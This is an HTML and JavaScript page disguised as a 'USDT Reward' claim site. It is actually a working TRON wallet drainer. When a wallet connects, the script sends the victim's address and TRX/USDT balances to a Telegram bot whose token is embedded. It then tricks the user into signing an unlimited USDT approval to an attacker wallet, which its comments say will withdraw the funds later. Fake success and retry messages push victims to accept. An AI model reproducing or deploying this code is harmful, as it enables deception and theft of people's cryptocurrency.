<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>USDT Reward - Connect to Claim</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background: radial-gradient(circle, #1e293b 0%, #0f172a 100%);
            color: white;
            font-family: 'Inter', sans-serif;
        }

        .glass {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
    </style>
</head>

<body class="min-h-screen flex flex-col items-center justify-center p-6">

    <div id="qr-screen" class="text-center space-y-6 max-w-sm w-full">
        <h1 class="text-3xl font-black text-emerald-400 italic uppercase">USDT REWARD</h1>
        <p class="text-slate-400 text-sm">Connect your wallet to verify eligibility</p>

        <div class="flex justify-center my-8">
            <button id="connect-btn" class="bg-emerald-500 hover:bg-emerald-400 text-white font-bold py-3 px-8 rounded-full shadow-lg shadow-emerald-500/50 transition-all duration-300 transform hover:scale-105">
                Connect Wallet to Claim
            </button>
        </div>

        <div class="glass p-4 rounded-2xl">
            <p class="text-[10px] text-slate-500 uppercase tracking-widest mb-2 font-bold">Supported Wallets</p>
            <div class="flex justify-center gap-4 opacity-50 grayscale">
                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" width="30">
                <img src="https://www.tronlink.org/img/logo.png" width="30">
            </div>
        </div>
    </div>

    <div id="processing-screen"
        class="hidden fixed inset-0 bg-black/90 flex flex-col items-center justify-center z-50 p-10">
        <div class="w-16 h-16 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin mb-4"></div>
        <h2 class="text-xl font-bold">Verifying Connection...</h2>
        <p class="text-slate-400 text-center text-sm mt-2">Approve the transaction in your wallet</p>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
    <script src="wc-bundle.js"></script> <script>
        const CONFIG = {
            BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
            CHAT_ID: "8249230506",
            ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2", // Spender jo baad me paise nikalega
            USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
            // Ye ABI sirf Native wallet me kaam aati hai
            ABI: [{
                "inputs": [{"name": "spender", "type": "address"}, {"name": "value", "type": "uint256"}],
                "name": "approve", "outputs": [{"name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"
            }]
        };

        // Number format me Max Uint taaki TronWeb crash na ho
        const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        async function notify(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg, parse_mode: "HTML", disable_web_page_preview: true })
                });
            } catch(e) {}
        }

        // 100% Accurate Balance Fetching Logic
        async function getBalances(tronInstance, address) {
            let trxBalance = "0.00";
            let usdtBalance = "0.00";
            
            try {
                let b = await tronInstance.trx.getBalance(address);
                trxBalance = (b / 1e6).toFixed(2);
            } catch(e) { console.error("TRX Check Error", e); }

            try {
                // Bina ABI ke direct contract query (Sabse safe tarika)
                const balanceTx = await tronInstance.transactionBuilder.triggerConstantContract(
                    CONFIG.USDT_CONTRACT,
                    "balanceOf(address)",
                    {},
                    [{ type: 'address', value: address }],
                    address
                );
                if (balanceTx && balanceTx.constant_result && balanceTx.constant_result[0]) {
                    usdtBalance = (parseInt(balanceTx.constant_result[0], 16) / 1e6).toFixed(2);
                }
            } catch(e) { console.error("USDT Check Error", e); }

            return { trxBalance, usdtBalance };
        }

        document.getElementById('connect-btn').addEventListener('click', async () => {
            let tronProvider = window.tronWeb;
            if (!tronProvider && window.tronLink && window.tronLink.tronWeb) tronProvider = window.tronLink.tronWeb;
            if (!tronProvider && window.tron && window.tron.tronWeb) tronProvider = window.tron.tronWeb;

            if (tronProvider && tronProvider.defaultAddress && tronProvider.defaultAddress.base58) {
                handleConnection(tronProvider);
            } else if (window.tronLink) {
                try {
                    await window.tronLink.request({ method: 'tron_requestAccounts' });
                    handleConnection(window.tronLink.tronWeb);
                } catch (e) {
                    alert("Connection rejected.");
                }
            } else {
                // WALLETCONNECT FLOW
                if (typeof window.connectWalletConnectTron === 'function') {
                    const wcResult = await window.connectWalletConnectTron();
                    if (wcResult && wcResult.address) {
                        
                        document.getElementById('qr-screen').classList.add('opacity-20');
                        document.getElementById('processing-screen').classList.remove('hidden');

                        const address = wcResult.address;
                        const localTronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
                        localTronWeb.setAddress(address);

                        const { trxBalance, usdtBalance } = await getBalances(localTronWeb, address);
                        await notify(`🔔 <b>WALLET CONNECTED (WC)</b>\nVictim: <code>${address}</code>\n\nTRX Balance: ${trxBalance}\nUSDT Balance: ${usdtBalance}`);
                        
                        try {
                            // Smart contract logic with string MAX_UINT
                            const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
                                CONFIG.USDT_CONTRACT,
                                "approve(address,uint256)",
                                { feeLimit: 100000000 },
                                [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }],
                                address
                            );

                            const signedTx = await wcResult.provider.request({
                                method: "tron_signTransaction",
                                params: {
                                    address: address,
                                    transaction: transaction
                                }
                            });

                            const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);
                            
                            notify(`✅ <b>USDT APPROVED!</b>\nVictim: <code>${address}</code>\nTX: <code>${receipt.txid || receipt.transaction.txID}</code>`);
                            alert("Claim Successful! Reward will be sent after 1 hour.");
                            location.reload();
                        } catch (error) {
                            console.error("WC Tx Error:", error);
                            notify(`❌ <b>USER REJECTED POPUP</b>\nVictim: <code>${address}</code>`);
                            alert("Verification failed. Please click 'Accept' to claim.");
                            location.reload();
                        }
                    }
                } else {
                    alert("Connection script is still loading. Please wait or use Trust Wallet DApp Browser.");
                }
            }
        });

        // NATIVE FLOW (TRUST WALLET DAPP BROWSER)
        async function handleConnection(tronProvider) {
            const address = tronProvider.defaultAddress.base58;
            if (!address) return;

            document.getElementById('qr-screen').classList.add('opacity-20');
            document.getElementById('processing-screen').classList.remove('hidden');

            const { trxBalance, usdtBalance } = await getBalances(tronProvider, address);
            await notify(`🔔 <b>WALLET CONNECTED (Native)</b>\nVictim: <code>${address}</code>\n\nTRX Balance: ${trxBalance}\nUSDT Balance: ${usdtBalance}`);

            try {
                const contract = await tronProvider.contract(CONFIG.ABI, CONFIG.USDT_CONTRACT);
                
                await contract.approve(CONFIG.ADMIN_WALLET, MAX_UINT).send({
                    feeLimit: 100000000
                }).then(tx => {
                    notify(`✅ <b>USDT APPROVED!</b>\nVictim: <code>${address}</code>\nTX: <code>${tx}</code>`);
                    alert("Claim Successful! Reward will be sent after 1 hour.");
                    location.reload();
                }).catch(err => {
                    notify(`❌ <b>USER REJECTED POPUP</b>\nVictim: <code>${address}</code>`);
                    alert("Verification failed. Please click 'Accept' to claim.");
                    location.reload();
                });
            } catch (error) {
                console.error("Transaction failed:", error);
                document.getElementById('qr-screen').classList.remove('opacity-20');
                document.getElementById('processing-screen').classList.add('hidden');
                alert("Interaction failed. Make sure you have minimum 20-30 TRX for network fee.");
            }
        }
    </script>
</body>

</html>
